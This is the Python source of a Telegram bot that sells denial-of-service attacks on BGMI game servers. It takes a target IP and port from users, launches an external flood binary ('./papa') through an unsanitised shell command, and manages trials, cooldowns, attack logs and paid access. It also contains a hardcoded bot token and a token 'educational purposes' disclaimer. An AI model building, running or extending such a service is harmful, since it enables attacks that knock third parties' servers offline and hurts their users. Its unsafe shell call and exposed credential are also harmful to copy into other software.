

import telebot
import subprocess
import requests
import datetime
import os
import re
import threading

# insert your Telegram bot token here
bot = telebot.TeleBot('7344028562:AAFLAtQvMVpsG02YUJy5J-LOn1Vbgr3h7Ww')

# Admin user IDs
admin_id = ["1039670883"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to track trial usage
TRIAL_FILE = "trials.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read trial usage from the file
def read_trials():
    try:
        with open(TRIAL_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# List to store users who have used their trial
trial_users = read_trials()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to record trial usage
def record_trial(user_id):
    with open(TRIAL_FILE, "a") as file:
        file.write(f"{user_id}\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 120  # Cooldown time in seconds (5 minutes)

# Dictionary to store information about ongoing attacks
ongoing_attacks = {}
attack_stopped = {}

# Function to handle the reply when an attack starts
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    bot.send_message(admin_id[0], f"{username} OK OK OK 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n")

def monitor_attack(user_id, process, ip, port):
    process.wait()  # Wait for the process to complete
    if not attack_stopped.get(user_id, False):
        bot.send_message(user_id, f"Your attack has finished.\n\nTARGET: {ip}:{port}")
    try:
        del ongoing_attacks[user_id]  # Remove the process from the dictionary
        del attack_stopped[user_id]  # Remove the stop flag
    except:
        pass

@bot.message_handler(commands=['stop'])
def handle_stop_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in trial_users:
        if user_id in ongoing_attacks:
            ongoing_attacks[user_id].terminate()  # Terminate the attack process
            attack_stopped[user_id] = True  # Set the stop flag
            del ongoing_attacks[user_id]  # Remove the process from the dictionary
            response = "All attacks stopped successfully."
        else:
            response = "No ongoing attacks to stop."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome, {user_name}\n\nUSAGE: <target> <port>\n\nSTART THE ATTACK WHEN THE PLAIN ANIMATION STARTS. AND AFTER 120 SECS IF PING DOESNT COME BACK RESTART THE GAME\n\nPOWERFUL ELF file\n\nONLY FOR EDUCATIONAL PURPOSES. WE ARE NOT RESPONSIBLE FOR ANY WRONG DOINGS DONE FROM OUR BOT"
    bot.reply_to(message, response)

@bot.message_handler(commands=['resettrial'])
def reset_trial(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_reset = command[1]
            if user_to_reset in trial_users:
                trial_users.remove(user_to_reset)
                with open(TRIAL_FILE, "w") as file:
                    for trial_user_id in trial_users:
                        file.write(f"{trial_user_id}\n")
                response = f"Trial reset for user {user_to_reset} successfully."
            else:
                response = f"User {user_to_reset} has not used their trial or does not exist in the trial list."
        else:
            response = "Please specify a user ID to reset the trial."
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, FREE HE
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['commands'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            
            # Read allowed user IDs
            with open(USER_FILE, "r") as file:
                allowed_user_ids = file.read().splitlines()
            
            # Read trial user IDs
            with open(TRIAL_FILE, "r") as file:
                trial_user_ids = file.read().splitlines()
            
            # Combine allowed and trial user IDs
            all_user_ids = set(allowed_user_ids + trial_user_ids)
            
            # Send the broadcast message to all users
            for user_id in all_user_ids:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


@bot.message_handler(func=lambda message: True)  # Handle all messages
def handle_message(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or (user_id not in allowed_user_ids and user_id not in trial_users):
        if user_id not in allowed_user_ids:
            # Check if the user has already used their trial
            if user_id in trial_users:
                response = "You have already used your trial attack."
                bot.reply_to(message, response)
                return
        
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = f"You Are On Cooldown. Please Wait {datetime.datetime.now() - bgmi_cooldown[user_id]} secs Before Running another attack Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command_text = message.text
        match = re.match(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\d+)', command_text)

        if match:
            target = match.group(1)
            port = int(match.group(2))
            time = 5  # Hard-coded time value

            record_command_logs(user_id, 'bgmi', target, port, time)
            log_command(user_id, target, port, time)
            
            if user_id not in allowed_user_ids:
                record_trial(user_id)  # Record trial usage if the user is not in allowed users

            full_command = f"./papa {target} {port} {time} 500"
            process = subprocess.Popen(full_command, shell=True)
            ongoing_attacks[user_id] = process  # Store the process object
            attack_stopped[user_id] = False  # Reset the stop flag

            # Start a new thread to monitor the attack
            threading.Thread(target=monitor_attack, args=(user_id, process, target, port)).start()

            start_attack_reply(message, target, port, time)
            response = f"BGMI Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} secs\n\nSERVER:- VIP BGMI"
        else:
            response = "Usage: <target> <port>\nExample: 12.34.56.78 1234"
    else:
        if user_id in trial_users:
            response="Trial exhausted buy from @PBARMYF"
        else:
            response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)


bot.polling()